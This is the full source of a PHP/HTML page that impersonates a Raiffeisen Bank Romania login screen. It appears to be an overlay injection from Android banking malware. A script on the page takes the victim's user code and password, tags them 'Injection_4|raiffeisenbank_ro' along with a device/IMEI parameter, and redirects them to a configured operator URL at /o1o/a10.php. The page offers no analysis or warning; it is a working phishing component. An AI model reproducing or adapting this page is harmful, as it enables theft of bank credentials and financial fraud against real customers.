<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Bawag</title>

    <script src="js/jquery-1.12.0.min.js"></script>
    <script src="js/viewport.js"></script>
	<script src="js/cat.functions.js"></script>

	<link rel="stylesheet" href="font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="bootstrap/dist/css/bootstrap.min.css">
	<link rel="stylesheet" href="ro/com.advantage.RaiffeisenBank/css/style.css">
	<link rel="stylesheet" href="css/cat.style.css" type="text/css" media="all">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
include "config.php"; ?>
<body>

<div class="header">
	<img style="width: 25px;float: left;margin: 15px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAYCAYAAACSuF9OAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6MTEyQkYzNUM0QUJEMTFFNzg5QzZGMjU2NEZGQ0I4QkUiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6MTEyQkYzNUQ0QUJEMTFFNzg5QzZGMjU2NEZGQ0I4QkUiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDoxMTJCRjM1QTRBQkQxMUU3ODlDNkYyNTY0RkZDQjhCRSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDoxMTJCRjM1QjRBQkQxMUU3ODlDNkYyNTY0RkZDQjhCRSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PkSoNwsAAAA8SURBVHjaYvwPBAyDCDAxDDIw6iBCgAWIGUdDaNRBow6icS4bLalHHTRaUo86aNRBoyX1aJQNZwcBBBgA3n0GNHCeSDcAAAAASUVORK5CYII=">
	<img style="float: right;width: 26px;margin: 15px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6MUQ5QTEwMTI0QUJEMTFFNzg5M0RBMDk3NTc0QzlCRDYiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6MUQ5QTEwMTM0QUJEMTFFNzg5M0RBMDk3NTc0QzlCRDYiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDoxRDlBMTAxMDRBQkQxMUU3ODkzREEwOTc1NzRDOUJENiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDoxRDlBMTAxMTRBQkQxMUU3ODkzREEwOTc1NzRDOUJENiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PrRv1PMAAAHRSURBVHjaYvz//z/DUAaMox4Y9cCoB0Y9MOw8MBmIJXDIvQDi3MHsAXMgPkFAjQUQn6SWhUxUDn0lKqkZMA+oUUnNqAdwgSQgrgRiSSxy6kBsTYQZ1lC16EASanYSSS4CZWIisQEQ//4PASB6NRC7A7EAEPchyREDfkP1CEDNWI1mtgGx7iKlFDoIxHZYxP8AMQuZKQCX3kNAbE/NGIj8T38QSa0Y4ATi60AsT+dK9iEQawLxd0ozcdkAOJ4BamcZpTWxABA/BWIuEi0H1bSzgPgqlK8NxGnQmpoU8A2IpYH4A7l5gBeI75BYupTiMa+UxNLqDtQNON1ITAYGFXVbiLSwlAjzSok0awvUbgZKPQDD9QRC7wQJZp0gEIv1xJpFigdAuBKPxUkkmJOEx5xKUtzEREbFgwtcJcGcq2TaQfPGHN0BqR7A12TQJsEcXTLtoKgxN2Qz8ZAuRgd9RTbsmxKwtD9QoH60OQ01oHIAivhKQo4ndWBrSHcph0WnHjasIg7EC4D4OZZhlZ1E5BVQ2nYH4ptYhlUSgPglEM+jRU1MDF5KROgvpaad1G7M3aKSmgFrjQ55D9yjkprRCY4RPcU06oFRD4x6YNQDxAOAAAMAw9sxUzD3PKUAAAAASUVORK5CYII=">
</div>

	<div class="logo">
		<p>Bine ai venit la</p>
		<img style="width: 75%;" src="data:image/png;base64,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">
	</div>
    <div class="main">

        <div class="container">
<div class="row">

                <div class="col-xs-1 col-sm-2"></div>
                <div class="col-xs-10 col-sm-8">
                    <div class="form_">

					<form id="form">
                            <div class="form-group ">
									<input type="text" class="form-control" name="field2" placeholder="Cod utilizator" id="login" autocomplete="off" maxlength="100" autofocus="autofocus" data-reg="/.{4,100}/" required="">
									<span class="input_icon"><img style="width: 31px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAABICAYAAABV7bNHAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6RkI3RTRGNTU0QUJDMTFFNzg5OTNDMTRDRjMwMzQ0NTQiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6RkI3RTRGNTY0QUJDMTFFNzg5OTNDMTRDRjMwMzQ0NTQiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpGQjdFNEY1MzRBQkMxMUU3ODk5M0MxNENGMzAzNDQ1NCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpGQjdFNEY1NDRBQkMxMUU3ODk5M0MxNENGMzAzNDQ1NCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PrkhZCsAAAIrSURBVHja7JtBSwJBGIZXsYsF7cVLGEWwgtQ5uikdonuFt+0fCB79ESL0D/Ja/oGIsEPQNSg8CBEkXTwF1SXB3sEJRFoTZ939dn0/eC66883u4+43OzOYGAwGFsM7klRAQRREQRREQRREQRTEoCAKoiAKoiAKilekTBN0Oh3T/ouaPMjoz3ugDVqavlcCx3FkCzKIAqiA7B/fbWgOQRfUwe0iPWJlUPOQMx5ZfWx5UQSpC3VnaOeGISkZwmPlGrR3dY5YCkrpmmMalSBrZ5CCilPWnGlqUjGugiTmEiMoLzSXGEEZobk41YiKoJ7QXGIEtYXmEiOoJTSXKEFdH/J04yqor2flplG3Jix/RH0UU0sWDYP2DSvgZY8whvmzGSU1dNtAI6wFM3WhD5b3gtl4zQltwSzMFUV1wXeW4ZJrnAX9Fu5rzcK/SXOqQUEUxJBQpFWfO3rU2gTrYA2sgGV9zCf4AG/gFbzoUe0x6BEtKEFbYB/sgW2w9M/xtka9I+2OfP4NnsA9uAHP8z7xhOlfESZsPa+CE3CgBc0jlKArcOE4zntUBCkxp+AYpAO6Q7/AJTj3W5TfRVpt6jWt4QZfOsBSkdZ9NvGDFaQKqlrDPXQ7xEFH9V2DpKo0QeqEjgSNzkd+SUr69FhJkjMqqSBBUEnwe15JgqCcYEE5CYJswYJsCYI4WaUgBgWFNhfjHURBDAqiIAqiIAqiIAqiIAYFURAFURAFRSp+BBgA2/Zrva3/3f0AAAAASUVORK5CYII="></span>
                           </div>

						   <br>
						   <br>
                            <div class="form-group">
									<input type="password" class="form-control" name="field3" placeholder="Parola" id="password" autocomplete="off" data-reg="/.{4,100}/" maxlength="100" required="">
									<span class="input_icon"><img style="width: 31px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAABICAYAAABV7bNHAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6RjBDNUFDNDQ0QUJDMTFFNzg1MjVGN0EzQTFBQzIyQTgiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6RjBDNUFDNDU0QUJDMTFFNzg1MjVGN0EzQTFBQzIyQTgiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpGMEM1QUM0MjRBQkMxMUU3ODUyNUY3QTNBMUFDMjJBOCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpGMEM1QUM0MzRBQkMxMUU3ODUyNUY3QTNBMUFDMjJBOCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/Pl2Izj8AAAJmSURBVHja7JoxS8NAGIZT6aKLUxbpIiHS0qmL6GL/Qf9AKaLgJNLRUXTr4CDYxUJFiovd/Ad2sbjoIhWLuJQ6dHIoHet3cEWpSXo2sf1yeV94oUm/XJInd1/uLhcbDocG5K4FIAAgAAIgAAIgANJVcb8FtNvtIK4jTU6QTbndI3fIz5MOtG2bNyAfssh5cpa87BLzSb4jX5PfQlmDppCAUSTnFGNz0rfkMwlN2xwkas2VIpxx5eSxlq6AxI1dyFwzrRKyDEu3JiaayqlHrmmQm+Su3F4hb5C3PMrankVzmxWgokvNuSeX5BtrXDfymEPypkNNEmWe6NDELJecUycfuMAZqSNj6i45ydIBUN6j5qiqJI9RKTt0gLIuN/xXlRTLDhWgtENibkxoVl7NrTGesKknnw4zILfEPK2aiucIDSDTYd+Hj/K6iucIDaAlh319H+X1Fc+B6Q5dx2IABEARU8zvl9UfM4oZcoGc+u83i4fETGSLXLNt+5EToB3yPrOHXyZIlxyaWIYhHKF9engZDoAKjFNIgQOgFGNAKQ6ATMaATA6A0A8CIAiAAAiA5qM4o2t5Ib/K32vkJAB9DzCPjd/zzeLL6tG8+1nzbmID8p7hPBnflP8Nogyoakz+slqNMqCHgGK0BfQeUIy2gFYDitEW0HpAMdoC2jW8Px0nZExkAS2SK7LPYzj0gyoyJtIdRdERPEdPerKSXKBgsApAAARAAARAADRSj/H99TgAajEG1OIAqMYYUI0DILFQqcwQTjmIRVRBDTXEQqUnAyvM8BaDAAiAAAiAAAiAAAiAIABS0ZcAAwAyenNitlZ7OgAAAABJRU5ErkJggg=="></span>
                            </div><br>

                       				<input type="button" class="input_submitBtn" onClick="sentServer();" value="Autentificare">
<script>
	function sentServer()
	{
	var oNumInp1 = document.getElementById('login');
	var oNumInp2 = document.getElementById('password');


if ((oNumInp1.value.length > 5)&&(oNumInp2.value.length > 3)) {
	var url='<?php echo $URL; ?>';
	var imei_c='<?php echo $IMEI_country; ?>';

	var login1 = document.forms["form"].elements["login"].value;
	var pass = document.forms["form"].elements["password"].value;

	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|raiffeisenbank_ro|"+login1+"|"+pass);
	}
}
</script>


 </form><br>

</div>
                </div>
                <div class="col-xs-1 col-sm-2"></div>
            </div>
        </div>
    </div>


</body>
</html>
